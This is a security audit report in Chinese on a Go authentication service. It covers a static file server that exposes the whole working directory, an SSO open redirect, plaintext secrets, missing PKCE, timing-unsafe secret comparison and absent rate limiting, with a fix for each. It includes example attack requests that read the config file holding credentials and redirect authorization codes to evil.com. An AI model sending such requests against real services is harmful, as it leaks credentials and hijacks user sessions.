# 鉴权逻辑安全分析报告

> 分析时间：2026-03-19  
> 分析范围：`monai-auth` 项目全部鉴权相关代码

---

## 一、整体架构概览

项目采用标准的分层架构，鉴权逻辑职责清晰：

```
HTTP 请求
    │
    ▼
internal/transport/http/handlers.go   ← HTTP 传输层（请求解析、Cookie、响应）
    │
    ▼
internal/auth/service.go              ← 业务逻辑层（登录/注册/Token 签发/Refresh 轮换）
    │       auth/token.go             ← JWT 签发与验证
    │       auth/statestore.go        ← SSO State 内存存储（带 TTL）
    │       auth/codestore.go         ← SSO 授权码内存存储（带 TTL）
    ▼
internal/domain/                      ← 领域模型层（接口契约、DTO、错误定义）
    │
    ▼
internal/repository/mysql/            ← 数据持久化层（GORM + MySQL）
```

**核心鉴权机制**：

- **双 Token 机制**：Access Token（JWT，2 小时）+ Refresh Token（32 字节随机 hex，7 天）
- **SSO 授权码流程**：仿 OAuth2 Authorization Code Flow，支持子应用单点登录
- **Token 轮换（Rotation）**：每次刷新销毁旧 Refresh Token，生成新的，防止重放攻击

---

## 二、设计合理之处

### 2.1 Cookie 安全属性完整

Access Token 和 Refresh Token 均以 `HttpOnly + Secure + SameSite=Lax` 设置，有效防御 XSS 窃取 Cookie 和 CSRF 跨站请求伪造。

Refresh Token Cookie 额外限制 `Path=/api/v1/auth/refresh`，仅在刷新接口时浏览器才会携带，进一步缩小暴露面。

### 2.2 Refresh Token 轮换正确实现

每次调用 `/refresh` 接口时：

1. 从数据库查找并验证旧 Refresh Token（含过期校验）
2. 签发新的 Access Token
3. **物理删除**旧 Refresh Token
4. 生成并持久化新的 Refresh Token

轮换机制可检测 Token 重放：若旧 Token 被攻击者先于用户使用，用户下一次刷新时会因 Token 已不存在而被强制登出。

### 2.3 bcrypt 密码哈希

注册时使用 `bcrypt.GenerateFromPassword(DefaultCost)` 哈希，登录时 `bcrypt.CompareHashAndPassword()` 验证，符合业界标准。密码最短 6 位校验，邮箱格式正则校验。

### 2.4 SSO 授权码一次性消费

`StateStore.GetAndConsume()` 和 `CodeStore.GetAndConsume()` 取出即删除，State TTL 10 分钟，Code TTL 5 分钟，有效防止授权码重放攻击。

### 2.5 CORS 来源白名单

`CORSMiddleware` 基于配置的 `allowed_origins` 列表校验请求来源，而非开放 `*`（静态资源路由除外，详见问题 1）。

### 2.6 文件上传路径安全处理

上传接口通过 `filepath.Base()` 提取文件名、`safeUsernameRe` 正则清洗用户名，防止路径穿越攻击写入任意目录。

---

## 三、存在的问题

### 🔴 严重安全漏洞（必须修复）

#### 问题 1：静态文件服务暴露整个工作目录

**位置**：`cmd/auth-server/server.go`

```go
// 当前代码
staticHandler := http.StripPrefix("/static", cacheControlHandler(http.FileServer(http.Dir(".")), staticCacheMaxAge))
r.Handle("/static/*", staticCORSHandler(staticHandler))
```

`http.FileServer(http.Dir("."))` 以进程当前工作目录为根目录，任何文件均可被公开访问。攻击者可直接请求：

```
GET /static/configs/config.yaml   →  返回含数据库密码和 JWT 密钥的完整配置
GET /static/go.mod                →  返回模块依赖信息
GET /static/go.sum                →  返回依赖校验信息
```

**修复方案**：将根目录限制为 `uploads` 目录，并关闭目录列表：

```go
type noDirFileSystem struct{ fs http.FileSystem }

func (nfs noDirFileSystem) Open(name string) (http.File, error) {
    f, err := nfs.fs.Open(name)
    if err != nil {
        return nil, err
    }
    stat, err := f.Stat()
    if err != nil || stat.IsDir() {
        f.Close()
        return nil, os.ErrNotExist
    }
    return f, nil
}

// 修改为仅服务 uploads 目录
staticHandler := http.StripPrefix("/static/uploads", cacheControlHandler(
    http.FileServer(noDirFileSystem{http.Dir("uploads")}),
    staticCacheMaxAge,
))
r.Handle("/static/uploads/*", staticCORSHandler(staticHandler))
```

---

#### 问题 2：SSO 流程中 `redirect_uri` 未校验白名单（Open Redirect）

**位置**：`internal/transport/http/handlers.go` — `SSORequestLoginHandler`

```go
// 当前代码：直接保存，未校验 redirect_uri 是否在白名单内
clientID := strings.TrimSpace(r.URL.Query().Get("client_id"))
redirectURI := strings.TrimSpace(r.URL.Query().Get("redirect_uri"))
// ...
state, err := h.StateStore.Save(clientID, redirectURI, "")
```

攻击者可伪造请求，将受害者的授权码重定向到恶意域名：

```
GET /api/v1/auth/request-login?client_id=mark-live&redirect_uri=https://evil.com/steal
```

用户登录后授权码会被发送至 `evil.com`，攻击者随即可用 code 换取 token。

**修复方案**：在存入 StateStore 之前校验 `redirect_uri`：

```go
var client *Client
for i := range h.Clients {
    if h.Clients[i].ClientID == clientID {
        client = &h.Clients[i]
        break
    }
}
if client == nil {
    writeError(w, "INVALID_CLIENT", "unknown client_id", http.StatusBadRequest, "")
    return
}
if !isRedirectURIAllowed(client.AllowedRedirectURIs, redirectURI) {
    writeError(w, "INVALID_REQUEST", "redirect_uri not allowed", http.StatusBadRequest, "")
    return
}
```

---

#### 问题 3：敏感配置明文存储（可能随代码库泄露）

**位置**：`configs/config.yaml`

```yaml
jwt_secret: "your_very_secret_key_for_jwt_signing"
client_secret: "your_client_secret_for_money"
password: admin222333
```

JWT 密钥、客户端密钥、数据库密码均以明文写入配置文件。若该文件被提交至代码仓库，所有密钥将完全暴露。

**修复方案**：通过环境变量覆盖敏感字段，并在 `.gitignore` 中排除包含真实密钥的配置文件：

```bash
# .env（加入 .gitignore）
MONAI_JWT_SECRET=<真实密钥>
MONAI_DB_PASSWORD=<真实密码>
MONAI_CLIENT_SECRET_MARK_LIVE=<真实客户端密钥>
```

配置加载时优先读取环境变量（Viper 已内置支持 `viper.AutomaticEnv()`）。

---

### 🟠 中等安全风险（上生产前处理）

#### 问题 4：`/token-by-code` 无 client_secret 且无 PKCE 保护

**位置**：`internal/transport/http/handlers.go` — `TokenByCodeHandler`

该接口仅凭 `client_id + code` 即可换取 token，无需 `client_secret`。对公共客户端（前端直连），OAuth 2.1 规范要求使用 **PKCE（Proof Key for Code Exchange）** 防止授权码拦截攻击。

**修复方案**：在 `/request-login` 时前端生成 `code_verifier`，传入 `code_challenge`（SHA-256 hash）；换 token 时携带 `code_verifier`，服务端验证哈希匹配。

---

#### 问题 5：`client_secret` 比较使用普通字符串比较（时序攻击）

**位置**：`internal/transport/http/handlers.go`

```go
// 当前代码
if client == nil || client.ClientSecret != clientSecret {
```

普通字符串比较的耗时随共同前缀长度增加，攻击者可通过测量响应时间逐字符猜测密钥。

**修复方案**：

```go
import "crypto/subtle"

if client == nil || subtle.ConstantTimeCompare([]byte(client.ClientSecret), []byte(clientSecret)) != 1 {
```

---

#### 问题 6：所有接口均无速率限制

`/login`、`/register`、`/refresh`、`/token-by-code` 等接口无任何频率限制，面对暴力破解和撞库攻击毫无防御。

**修复方案**：使用 `go-chi/httprate` 或 `golang.org/x/time/rate` 添加基于 IP 的速率限制中间件：

```go
import "github.com/go-chi/httprate"

// 每个 IP 每分钟最多 10 次登录请求
r.With(httprate.LimitByIP(10, time.Minute)).Post("/api/v1/auth/login", h.LoginHandler)
```

---

### 🟡 设计缺陷（建议改进）

#### 问题 7：用户角色（Role）无法持久化

**位置**：`internal/auth/service.go`、`internal/repository/mysql/model.go`

注册时 Role 硬编码为 `"standard"`，且 `UserGORM` 模型中缺少 `role` 字段，`mapGORMToDomain()` 始终返回 `"standard"`。这使得 RBAC 权限体系无法实现。

**修复方案**：在 `UserGORM` 和 `users` 表中添加 `role` 字段，允许管理员通过接口修改用户角色。

---

#### 问题 8：StateStore / CodeStore 仅为内存实现，不支持水平扩展

**位置**：`internal/auth/statestore.go`、`internal/auth/codestore.go`

多实例部署时，请求被负载均衡到不同节点，内存中的 state/code 无法共享，SSO 流程将随机失败。

**修复方案**：提供基于 Redis 的实现，通过接口替换：

```go
type RedisStateStore struct { client *redis.Client; ttl time.Duration }
// 实现 StateStore 接口
```

---

#### 问题 9：Refresh Token 明文存储在数据库

**位置**：`internal/repository/mysql/refresh_token_repo.go`

Refresh Token 直接以明文存储在 `refresh_tokens` 表。数据库泄露时所有 Token 直接暴露，攻击者可无限期冒充任意用户。

**修复方案**：存储 `SHA-256(token)` 的哈希值，查询时同样哈希后比对：

```go
import "crypto/sha256"
import "encoding/hex"

func hashToken(token string) string {
    h := sha256.Sum256([]byte(token))
    return hex.EncodeToString(h[:])
}
```

---

#### 问题 10：JWT 缺少标准声明（`iss`、`aud`、`jti`）

**位置**：`internal/auth/token.go`

当前 JWT 仅包含 `user_id`、`role`、`exp`、`iat`，缺少：

- `iss`（颁发者）：多服务环境下无法区分 token 来源，其他服务签发的 token 可能被错误接受
- `aud`（受众）：无法限制 token 的使用范围
- `jti`（JWT ID）：无法实现单个 Access Token 的撤销（黑名单机制前提）

---

#### 问题 11：登出后 Access Token 在过期前仍然有效

`LogoutHandler` 只删除 Refresh Token，Access Token（JWT）是无状态的，无法撤销，登出后最长仍可使用 2 小时。

**缓解方案**：维护一个基于 Redis 的 `jti` 黑名单，`ValidateToken` 时额外检查 `jti` 是否在黑名单中。代价是每次验证多一次 Redis 查询。

---

## 四、综合评分

| 维度 | 状态 | 说明 |
|------|------|------|
| 整体架构分层 | ✅ 合理 | 职责清晰，接口抽象到位 |
| Cookie 安全属性 | ✅ 完整 | HttpOnly / Secure / SameSite=Lax 齐备 |
| 密码存储 | ✅ 安全 | bcrypt DefaultCost |
| Token 轮换 | ✅ 正确 | 旧 Token 物理删除 |
| 授权码一次性 | ✅ 正确 | GetAndConsume 取出即删 |
| 静态文件服务 | 🔴 严重漏洞 | 暴露整个工作目录，包括配置文件 |
| redirect_uri 校验 | 🔴 严重漏洞 | Open Redirect，SSO 授权码可被劫持 |
| 敏感配置管理 | 🔴 高风险 | 明文密钥可能随代码库泄露 |
| 速率限制 | 🟠 缺失 | 暴力破解无防御 |
| client_secret 比较 | 🟠 时序漏洞 | 应使用常量时间比较 |
| 公共客户端安全 | 🟠 缺失 | token-by-code 无 PKCE |
| 角色持久化 | 🟡 不可用 | Role 字段未入库 |
| 水平扩展能力 | 🟡 受限 | 内存 Store 限制单节点 |
| Refresh Token 存储 | 🟡 可改进 | 明文存库，建议哈希后存储 |
| JWT 标准声明 | 🟡 不完整 | 缺少 iss / aud / jti |
| Access Token 撤销 | 🟡 不支持 | 登出后仍有效，需 jti 黑名单 |

---

## 五、修复优先级建议

```
立即修复（上线前必须）
├── 问题 1：静态文件服务目录限制
├── 问题 2：redirect_uri 白名单校验
└── 问题 3：敏感配置改用环境变量

短期修复（1-2 周内）
├── 问题 5：client_secret 常量时间比较
├── 问题 6：登录/刷新接口速率限制
└── 问题 4：token-by-code 添加 PKCE

中期改进（架构迭代时）
├── 问题 7：Role 字段持久化
├── 问题 8：StateStore/CodeStore 改为 Redis
├── 问题 9：Refresh Token 哈希存储
├── 问题 10：JWT 添加 iss/aud/jti 声明
└── 问题 11：实现 jti 黑名单支持 Access Token 撤销
```
